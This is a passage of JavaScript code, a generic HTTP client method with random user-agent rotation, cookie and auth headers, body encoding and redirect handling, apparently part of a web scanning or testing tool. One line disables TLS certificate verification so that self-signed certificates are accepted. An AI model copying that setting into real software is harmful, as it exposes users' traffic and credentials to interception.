    // Send a single HTTP request
    async request(urlStr, options = {}) {
        const method = (options.method || 'GET').toUpperCase();
        const headers = {
            'User-Agent': options.userAgent || USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'identity',
            'Connection': 'close',
            ...options.headers
        };

        if (options.cookies) {
            headers['Cookie'] = typeof options.cookies === 'string'
                ? options.cookies
                : Object.entries(options.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
        }
        if (options.bearer) headers['Authorization'] = `Bearer ${options.bearer}`;
        if (options.basicAuth) {
            const encoded = Buffer.from(`${options.basicAuth.user}:${options.basicAuth.pass}`).toString('base64');
            headers['Authorization'] = `Basic ${encoded}`;
        }

        let body = null;
        if (options.body) {
            if (typeof options.body === 'object') {
                if (options.contentType === 'form') {
                    body = Object.entries(options.body).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                } else {
                    body = JSON.stringify(options.body);
                    headers['Content-Type'] = 'application/json';
                }
            } else {
                body = options.body;
                if (!headers['Content-Type']) headers['Content-Type'] = 'text/plain';
            }
            headers['Content-Length'] = Buffer.byteLength(body);
        }

        return new Promise((resolve) => {
            const startTime = Date.now();
            let redirectCount = 0;

            const makeRequest = (currentUrl) => {
                try {
                    const parsed = new URL(currentUrl);
                    const lib = parsed.protocol === 'https:' ? https : http;

                    const reqOptions = {
                        hostname: parsed.hostname,
                        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                        path: parsed.pathname + parsed.search,
                        method,
                        headers,
                        timeout: this.timeout,
                        rejectUnauthorized: false // Accept self-signed certs
                    };

                    const req = lib.request(reqOptions, (res) => {
                        let data = '';
                        res.on('data', chunk => data += chunk);
                        res.on('end', () => {
                            const elapsed = Date.now() - startTime;

                            // Handle redirects
                            if ([301, 302, 303, 307, 308].includes(res.statusCode) && this.followRedirects && redirectCount < this.maxRedirects) {
                                const location = res.headers['location'];
                                if (location) {
                                    redirectCount++;
                                    const nextUrl = location.startsWith('http') ? location : new URL(location, currentUrl).toString();
                                    return makeRequest(nextUrl);
                                }
                            }

                            resolve({
                                success: true,
                                url: currentUrl,
                                status: res.statusCode,
                                headers: res.headers,
                                body: data,
                                bodyLength: data.length,
                                elapsed,
                                redirects: redirectCount
                            });
                        });
                    });

                    req.on('timeout', () => {
                        req.destroy();
                        resolve({ success: false, url: currentUrl, error: 'Timeout', elapsed: Date.now() - startTime });
                    });

                    req.on('error', (err) => {
                        resolve({ success: false, url: currentUrl, error: err.message, elapsed: Date.now() - startTime });
                    });

                    if (body) req.write(body);
                    req.end();
                } catch (err) {
                    resolve({ success: false, url: currentUrl, error: err.message, elapsed: 0 });
                }
            };

            makeRequest(urlStr);
        });
    }

